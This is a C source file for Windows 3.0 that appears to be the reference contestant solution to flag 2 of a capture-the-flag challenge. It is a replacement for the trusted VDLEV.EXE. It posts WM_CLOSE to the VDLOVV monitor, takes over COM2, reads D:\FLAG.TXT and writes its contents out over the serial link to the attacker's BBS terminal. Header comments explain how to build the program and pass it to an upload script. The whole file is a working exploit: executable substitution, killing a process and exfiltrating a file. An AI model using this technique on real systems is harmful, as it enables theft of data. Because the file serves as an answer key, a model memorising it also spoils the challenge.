/****************************************************************************

    VDFLG.C - reference contestant VDLEV.EXE replacement for flag 2.

    When VDLOVV loads this in place of the real VDLEV.EXE it:
      1. Sends WM_CLOSE to VDLOVV, which causes VDLOVV to CloseComm and exit,
         freeing COM2.
      2. Polls GetModuleHandle("VDLOVV") every 100 ms until the module
         disappears (8-second guard).
      3. Opens COM2 at 1200-8N1 via OpenComm/BuildCommDCB/SetCommState.
         dcb.Id must be set manually after BuildCommDCB (it does not fill it).
      4. Reads D:\FLAG.TXT via the KERNEL OpenFile/_lread API.
         C-runtime fopen/_open are absent from WINLIB.10 and cause NEIERR.
      5. Writes the flag bytes to COM2 with WriteComm, then waits 3 s for the
         TX queue to drain at 1200 baud before calling CloseComm and exiting.

    VINDAASEN's ReadUpdateResponse() drains COM3 (= VDLOVV machine's COM2)
    for 10 seconds, echoing every received byte to COM2 (the BBS line).
    The flag therefore appears on the attacker's BBS terminal.

    Build in the WIN3.0 VM with VDFLG/ mounted as a drive, then run BUILD.BAT
    from that drive.  Copy the resulting VDFLG.EXE to the host and pass it to
    upload_flag2.py.

    NOTE: HEAPSIZE must be at least 1024 (matching VDLEV.DEF) -- 256 is too
    small for CreateWindow to succeed, so WM_CREATE never fires.

****************************************************************************/

#include <windows.h>

HANDLE hInst;

#define ID_TIMER       1
#define CLOSE_TIMEOUT  8000L    /* ms to wait for VDLOVV to unload */
#define DRAIN_TIMEOUT  3000L    /* ms to let 1200-baud TX queue drain */

#define ST_WAIT_CLOSE  1        /* polling for VDLOVV to disappear */
#define ST_DRAIN       2        /* flag sent; waiting to close COM2 */

static int   appState = 0;
static DWORD deadline  = 0;
static int   cid       = -1;

long FAR PASCAL WndProc(HWND, unsigned, WORD, LONG);

static void SendFlag(void)
{
    DCB      dcb;
    OFSTRUCT of;
    int      f;
    char     buf[256];
    WORD     n;

    cid = OpenComm((LPSTR)"COM2", 1024, 4096);
    if (cid < 0) return;

    BuildCommDCB((LPSTR)"COM2:1200,n,8,1", &dcb);
    dcb.Id = (BYTE)cid;          /* BuildCommDCB does not fill dcb.Id */
    SetCommState(&dcb);

    /* dosbox-x nullmodem: VDLOVV's CommClose dropped DTR which closed the
       TCP connection to VINDAASEN's COM3.  SetCommState above re-raises DTR
       which triggers a TCP reconnect, but it's async -- spin 1 s so the
       TCP handshake completes before we write flag bytes. */
    {
        DWORD t = GetCurrentTime() + 1000L;
        while ((long)(GetCurrentTime() - t) < 0) {}
    }

    f = OpenFile((LPSTR)"D:\\FLAG.TXT", (LPOFSTRUCT)&of, OF_READ);
    if (f >= 0) {
        n = _lread(f, (LPSTR)buf, sizeof(buf) - 1);
        _lclose(f);
        if (n != 0xFFFF && n > 0)
            WriteComm(cid, (LPSTR)buf, (int)n);
    }
    /* cid stays open until DRAIN_TIMEOUT fires so the TX queue can drain. */
}

int PASCAL WinMain(HANDLE hInstance, HANDLE hPrev, LPSTR lpCmd, int nCmdShow)
{
    MSG      msg;
    WNDCLASS wc;
    HWND     hWnd;

    if (!hPrev) {
        wc.style         = 0;
        wc.lpfnWndProc   = WndProc;
        wc.cbClsExtra    = 0;
        wc.cbWndExtra    = 0;
        wc.hInstance     = hInstance;
        wc.hIcon         = NULL;
        wc.hCursor       = NULL;
        wc.hbrBackground = GetStockObject(WHITE_BRUSH);
        wc.lpszMenuName  = NULL;
        wc.lpszClassName = (LPSTR)"VdflgClass";
        if (!RegisterClass(&wc)) return (FALSE);
    }
    hInst = hInstance;

    hWnd = CreateWindow((LPSTR)"VdflgClass", (LPSTR)"VDFLG",
        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 200, 80,
        NULL, NULL, hInstance, NULL);
    if (!hWnd) return (FALSE);

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    while (GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (msg.wParam);
}

long FAR PASCAL WndProc(HWND hWnd, unsigned message, WORD wParam, LONG lParam)
{
    switch (message) {
        case WM_CREATE:
        {
            HWND hMon = FindWindow((LPSTR)"VdlovvClass", (LPSTR)NULL);
            if (hMon) PostMessage(hMon, WM_CLOSE, 0, 0L);
            appState = ST_WAIT_CLOSE;
            deadline = GetCurrentTime() + CLOSE_TIMEOUT;
            SetTimer(hWnd, ID_TIMER, 100, NULL);
            break;
        }
        case WM_TIMER:
            if (appState == ST_WAIT_CLOSE) {
                if (GetModuleHandle((LPSTR)"VDLOVV") == NULL ||
                    (long)(GetCurrentTime() - deadline) >= 0) {
                    KillTimer(hWnd, ID_TIMER);
                    SendFlag();
                    appState = ST_DRAIN;
                    SetTimer(hWnd, ID_TIMER, DRAIN_TIMEOUT, NULL);
                }
            } else if (appState == ST_DRAIN) {
                if (cid >= 0) { CloseComm(cid); cid = -1; }
                DestroyWindow(hWnd);
            }
            break;
        case WM_DESTROY:
            KillTimer(hWnd, ID_TIMER);
            PostQuitMessage(0);
            break;
        default:
            return (DefWindowProc(hWnd, message, wParam, lParam));
    }
    return (0L);
}
